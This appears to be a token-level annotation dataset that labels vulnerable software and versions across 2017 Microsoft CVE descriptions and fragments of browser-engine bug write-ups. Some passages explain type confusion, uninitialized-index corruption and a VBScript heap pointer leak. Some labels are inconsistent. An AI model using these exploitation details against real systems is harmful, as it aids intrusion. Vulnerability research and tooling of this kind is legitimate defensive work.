Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
Microsoft O O
browser O O
JavaScript O O
engines O O
render O O
content O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8635 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

So O O
if O O
( O O
argCount O O
! O O
= O O
( O O
Js O O
: O O
:ArgSlot O O
) O O
argCount O O
) O O
has O O
no O O
point O O
. O O

And O O
argCount O O
is O O
of O O
the O O
type O O
Js O O
: O O
:ArgSlot O O
. O O

void O O
EmitNew O O
( O O
ParseNode O O
pnode O O
, O O
ByteCodeGenerator O O
byteCodeGenerator O O
, O O
FuncInfo O O
funcInfo O O
) O O
{ O O
Js O O
: O O
:ArgSlot O O
argCount O O
= O O
pnode- O O
> O O
sxCall.argCount O O
; O O
argCount++ O O
; O O
include O O
this O O
BOOL O O
fSideEffectArgs O O
= O O
FALSE O O
; O O
unsigned O O
int O O
tmpCount O O
= O O
CountArguments O O
( O O
pnode- O O
> O O
sxCall.pnodeArgs O O
, O O
& O O
fSideEffectArgs O O
) O O
; O O
Assert O O
( O O
argCount O O
tmpCount O O
) O O
; O O
if O O
( O O
argCount O O
! O O
= O O
( O O
Js O O
: O O
:ArgSlot O O
) O O
argCount O O
) O O
{ O O
Js O O
: O O
:Throw O O
: O O
:OutOfMemory O O
Js O O
: O O
:ArgSlot O O
is O O
a O O
16 O O
bit O O
unsigned O O
integer O O
type O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft O O
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
due O O
to O O
the O O
way O O
that O O
JavaScript O O
engines O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8634 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

In O O
the O O
release O O
build O O
, O O
propertyIndex O O
remains O O
uninitialized O O
, O O
this O O
will O O
cause O O
a O O
memory O O
corruption O O
. O O

But O O
if O O
the O O
method O O
exits O O
at O O
( O O
a O O
) O O
, O O
descriptor- O O
> O O
Attributes O O
will O O
remain O O
with O O
PropertyDeleted O O
set O O
, O O
and O O
therefore O O
we O O
can O O
call O O
TryUndeleteProperty O O
again O O
and O O
again O O
until O O
deletedPropertyIndex O O
becames O O
NoSlots O O
which O O
makes O O
TryReuseDeletedPropertyIndex O O
return O O
false O O
. O O

In O O
the O O
debug O O
build O O
, O O
the O O
PoC O O
hits O O
the O O
assertion O O
Assert O O
( O O
reused O O
) O O
; O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8635 O O
, O O
CVE-2017-8636 O O
, O O
CVE-2017-8638 O O
, O O
CVE-2017-8639 O O
, O O
CVE-2017-8640 O O
, O O
CVE-2017-8641 O O
, O O
CVE-2017-8645 O O
, O O
CVE-2017-8646 O O
, O O
CVE-2017-8647 O O
, O O
CVE-2017-8655 O O
, O O
CVE-2017-8656 O O
, O O
CVE-2017-8657 O O
, O O
CVE-2017-8670 O O
, O O
CVE-2017-8671 O O
, O O
CVE-2017-8672 O O
, O O
and O O
CVE-2017-8674 O O
. O O

In O O
the O O
first O O
loop O O
, O O
aItem O O
is O O
an O O
array O O
, O O
and O O
firstPromotedItemIsSpreadable O O
remains O O
true O O
because O O
the O O
condition O O
for O O
the O O
fast O O
path O O
is O O
satisfied O O
. O O

In O O
the O O
second O O
loop O O
, O O
aItem O O
is O O
0x1234 O O
and O O
not O O
spreadable O O
, O O
but O O
the O O
code O O
at O O
( O O
a O O
) O O
makes O O
the O O
spreadable O O
variable O O
true O O
, O O
thus O O
it O O
reaches O O
( O O
b O O
) O O
and O O
a O O
type O O
confusion O O
occurs O O
. O O

A O O
remote O O
code O O
execution O O
vulnerability O O
exists O O
in O O
Microsoft S-vulnerable_software pair_0
Excel S-vulnerable_software pair_0
2010 S-vulnerable_version pair_0
Service S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
2 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
Excel S-vulnerable_software pair_1
2013 S-vulnerable_version pair_1
Service S-vulnerable_version pair_1
Pack S-vulnerable_version pair_1
1 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
Excel S-vulnerable_software pair_2
2013 S-vulnerable_version pair_2
RT S-vulnerable_version pair_2
Service S-vulnerable_version pair_2
Pack S-vulnerable_version pair_2
1 S-vulnerable_version pair_2
, O O
Microsoft S-vulnerable_software pair_3
Excel S-vulnerable_software pair_3
2016 S-vulnerable_version pair_3
, O O
Microsoft S-vulnerable_software pair_4
Office S-vulnerable_software pair_4
Web S-vulnerable_software pair_4
Apps S-vulnerable_software pair_4
2013 S-vulnerable_version pair_4
, O O
Microsoft S-vulnerable_software pair_5
Excel S-vulnerable_software pair_5
for O O
Mac O O
2011 S-vulnerable_version pair_5
, O O
Microsoft S-vulnerable_software pair_6
Excel S-vulnerable_software pair_6
2016 S-vulnerable_version pair_6
for O O
Mac O O
, O O
and O O
Microsoft S-vulnerable_software pair_7
Office S-vulnerable_software pair_7
Compatibility S-vulnerable_software pair_7
Pack S-vulnerable_software pair_7
Service S-vulnerable_version pair_7
Pack S-vulnerable_version pair_7
3 S-vulnerable_version pair_7
, O O
when O O
they O O
fail O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8630 O O
, O O
CVE-2017-8631 O O
, O O
and O O
CVE-2017-8744 O O
. O O

A O O
remote O O
code O O
execution O O
vulnerability O O
exists O O
in O O
Excel O O
Services O O
, O O
Microsoft S-vulnerable_software pair_0
Excel S-vulnerable_software pair_0
2007 S-vulnerable_version pair_0
Service S-vulnerable_version pair_0
Pack S-vulnerable_version pair_0
3 S-vulnerable_version pair_0
, O O
Microsoft S-vulnerable_software pair_1
Excel S-vulnerable_software pair_1
2010 S-vulnerable_version pair_1
Service S-vulnerable_version pair_1
Pack S-vulnerable_version pair_1
2 S-vulnerable_version pair_1
, O O
Microsoft S-vulnerable_software pair_2
Excel S-vulnerable_software pair_2
2013 S-vulnerable_version pair_2
Service S-vulnerable_version pair_2
Pack S-vulnerable_version pair_2
1 S-vulnerable_version pair_2
, O O
Microsoft S-vulnerable_software pair_3
Excel S-vulnerable_software pair_3
2013 S-vulnerable_version pair_3
RT S-vulnerable_version pair_3
Service S-vulnerable_version pair_3
Pack S-vulnerable_version pair_3
1 S-vulnerable_version pair_3
, O O
Microsoft S-vulnerable_software pair_4
Excel S-vulnerable_software pair_4
2016 S-vulnerable_version pair_4
, O O
Microsoft S-vulnerable_software pair_5
Office S-vulnerable_software pair_5
Web S-vulnerable_software pair_5
Apps S-vulnerable_software pair_5
2013 S-vulnerable_version pair_5
, O O
Microsoft S-vulnerable_software pair_6
Office S-vulnerable_software pair_6
Compatibility S-vulnerable_software pair_6
Pack S-vulnerable_software pair_6
Service S-vulnerable_version pair_6
Pack S-vulnerable_version pair_6
3 S-vulnerable_version pair_6
, O O
Microsoft S-vulnerable_software pair_7
Excel S-vulnerable_software pair_7
Web S-vulnerable_software pair_7
App S-vulnerable_software pair_7
2013 S-vulnerable_version pair_7
Service S-vulnerable_version pair_7
Pack S-vulnerable_version pair_7
1 S-vulnerable_version pair_7
, O O
Microsoft S-vulnerable_software pair_8
Excel S-vulnerable_software pair_8
Viewer S-vulnerable_software pair_8
2007 S-vulnerable_version pair_8
Service S-vulnerable_version pair_8
Pack S-vulnerable_version pair_8
3 S-vulnerable_version pair_8
, O O
and O O
Office O O
Online O O
Server O O
when O O
they O O
fail O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8630 O O
, O O
CVE-2017-8632 O O
, O O
and O O
CVE-2017-8744 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8631 O O
, O O
CVE-2017-8632 O O
, O O
and O O
CVE-2017-8744 O O
. O O

Microsoft S-vulnerable_software pair_0
Office S-vulnerable_software pair_0
2016 S-vulnerable_version pair_0
allows O O
a O O
remote O O
code O O
execution O O
vulnerability O O
when O O
it O O
fails O O
to O O
properly O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Office O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-9598 O O
and O O
CVE-2017-8609 O O
. O O

Microsoft O O
Edge O O
on O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
a O O
remote O O
code O O
execution O O
vulnerability O O
in O O
the O O
way O O
affected O O
Microsoft O O
scripting O O
engines O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
and S-vulnerable_version pair_5
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
Internet O O
Explorer O O
in O O
the O O
way O O
affected O O
Microsoft O O
scripting O O
engines O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-9598 O O
and O O
CVE-2017-8609 O O
. O O

On O O
64-bit O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
in O O
IE S-vulnerable_software pair_1
Version O O
11.1066.14393.0 S-vulnerable_version pair_1
( O O
Update O O
version O O
11.0.41 O O
) O O
I O O
managed O O
to O O
set O O
the O O
result O O
type O O
to O O
5 O O
( O O
Double O O
) O O
which O O
causes O O
a O O
heap O O
pointer O O
leak O O
( O O
see O O
the O O
attached O O
screenshots O O
) O O
as O O
the O O
pointer O O
inside O O
v1 O O
will O O
be O O
treated O O
as O O
a O O
double O O
value O O
. O O

This O O
issue O O
is O O
not O O
limited O O
to O O
VbsVarMod O O
and O O
affects O O
other O O
arithmetic O O
functions O O
that O O
call O O
PvarGetArithVal O O
and O O
use O O
a O O
result O O
lookup O O
table O O
as O O
well O O
( O O
specifically O O
: O O
VbsVarAdd O O
, O O
VbsVarSub O O
, O O
VbsVarMul O O
, O O
VbsVarDiv O O
, O O
VbsVarIDiv O O
, O O
VbsVarPow O O
) O O
to O O
a O O
varying O O
degree O O
of O O
exploitability O O
( O O
depending O O
on O O
how O O
aggressive O O
checks O O
on O O
the O O
result O O
type O O
they O O
make O O
) O O
. O O

If O O
we O O
change O O
v1 O O
to O O
an O O
array O O
( O O
which O O
typically O O
has O O
vartype O O
of O O
8192 O O
) O O
, O O
suddenly O O
there O O
will O O
be O O
an O O
out-of-bound O O
access O O
when O O
looking O O
up O O
the O O
result O O
type O O
and O O
the O O
result O O
type O O
can O O
become O O
unexpected O O
. O O

There O O
might O O
also O O
be O O
a O O
possibilty O O
to O O
use O O
invalid O O
return O O
type O O
values O O
> O O
=18 O O
as O O
a O O
trampoline O O
, O O
i.e O O
. O O

This O O
causes O O
a O O
type O O
confusion O O
in O O
v1 O O
. O O

However O O
, O O
if O O
an O O
attacker O O
was O O
lucky O O
and O O
managed O O
to O O
select O O
as O O
result_type O O
something O O
that O O
contains O O
a O O
pointer O O
( O O
Such O O
as O O
a O O
String O O
or O O
an O O
Object O O
) O O
this O O
could O O
result O O
in O O
a O O
type O O
confusion O O
with O O
a O O
more O O
serious O O
impact O O
( O O
a O O
larger O O
info O O
leak O O
in O O
case O O
of O O
a O O
String O O
and O O
possibly O O
RCE O O
in O O
case O O
of O O
an O O
Object O O
) O O
. O O

One O O
way O O
to O O
fix O O
this O O
in O O
the O O
affected O O
functions O O
is O O
to O O
do O O
a O O
check O O
for O O
vartype O O
< O O
18 O O
only O O
after O O
both O O
variables O O
have O O
been O O
read O O
. O O

In O O
case O O
of O O
VbsVarMod O O
( O O
) O O
if O O
the O O
result O O
type O O
is O O
not O O
10 O O
( O O
Error O O
) O O
,2 O O
( O O
Integer O O
) O O
,3 O O
( O O
Long O O
) O O
or O O
4 O O
( O O
single O O
) O O
, O O
the O O
function O O
will O O
simply O O
assign O O
the O O
result O O
type O O
to O O
the O O
result O O
variable O O
( O O
v1 O O
) O O
, O O
while O O
the O O
actual O O
data O O
will O O
remain O O
unchanged O O
. O O

The O O
problem O O
is O O
that O O
the O O
call O O
to O O
v2- O O
> O O
PvarGetArithVal O O
( O O
) O O
can O O
run O O
arbitrary O O
script O O
which O O
can O O
change O O
the O O
type O O
of O O
arith_v1 O O
. O O

Which O O
result O O
type O O
an O O
attacker O O
can O O
select O O
depends O O
on O O
the O O
build O O
of O O
vbscript.dll O O
. O O

Microsoft S-vulnerable_software pair_0
Internet S-vulnerable_software pair_0
Explorer S-vulnerable_software pair_0
11.1066.14393.0 S-vulnerable_version pair_0
- O O
VBScript O O
Arithmetic O O
Functions O O
Type O O
Confusion O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8598 O O
, O O
CVE-2017-8596 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engine O O
fails O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
Edge O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

Microsoft O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engine O O
fails O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
Internet O O
Explorer O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8598 O O
, O O
CVE-2017-8596 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
and O O
CVE-2017-8609 O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
Server S-vulnerable_version pair_0
2008 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
R2 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
8.1 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
RT S-vulnerable_version pair_2
8.1 S-vulnerable_version pair_2
, O O
Windows S-vulnerable_software pair_3
Server S-vulnerable_version pair_3
2012 S-vulnerable_version pair_3
and S-vulnerable_version pair_3
R2 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
10 S-vulnerable_version pair_4
Gold S-vulnerable_version pair_4
, O O
1511 S-vulnerable_version pair_4
, O O
1607 S-vulnerable_version pair_4
, O O
and S-vulnerable_version pair_4
1703 S-vulnerable_version pair_4
, O O
and O O
Windows S-vulnerable_software pair_5
Server S-vulnerable_version pair_5
2016 S-vulnerable_version pair_5
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engines O O
fail O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
browsers O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Microsoft O O
browsers O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 O O
Gold O O
, O O
1511 O O
, O O
1607 O O
, O O
and O O
1703 O O
, O O
and O O
Windows O O
Server S-vulnerable_version pair_5
2016 S-vulnerable_version pair_5
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engines O O
fail O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
browsers O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8598 O O
, O O
CVE-2017-8596 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8598 O O
, O O
CVE-2017-8596 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engine O O
fails O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
Edge O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8598 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8598 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allow O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
when O O
the O O
JavaScript O O
engine O O
fails O O
to O O
render O O
when O O
handling O O
objects O O
in O O
memory O O
in O O
Microsoft O O
Edge O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8598 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8595 O O
, O O
CVE-2017-8601 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
and O O
CVE-2017-8609 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-8596 O O
, O O
CVE-2017-8610 O O
, O O
CVE-2017-8618 O O
, O O
CVE-2017-8619 O O
, O O
CVE-2017-8603 O O
, O O
CVE-2017-8604 O O
, O O
CVE-2017-8605 O O
, O O
CVE-2017-8606 O O
, O O
CVE-2017-8607 O O
, O O
CVE-2017-8608 O O
, O O
CVE-2017-8598 O O
and O O
CVE-2017-8609 O O
. O O

This O O
time O O
, O O
func O O
( O O
a O O
, O O
b O O
, O O
i O O
) O O
; O O
is O O
replaced O O
with O O
func O O
( O O
a O O
, O O
b O O

But O O
it O O
seems O O
they O O
fixed O O
it O O
incorrectly O O
again O O
. O O

Tested O O
on O O
Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
40.15063.0.0 S-vulnerable_version pair_0
( O O
Insider O O
Preview O O
) O O
. O O

Microsoft S-vulnerable_software pair_0
Edge S-vulnerable_software pair_0
40.15063.0.0 S-vulnerable_version pair_0
Chakra O O
- O O
Incorrect O O
JIT O O
Optimization O O
with O O
TypedArray O O
Setter O O
3 O O

Microsoft O O
Edge O O
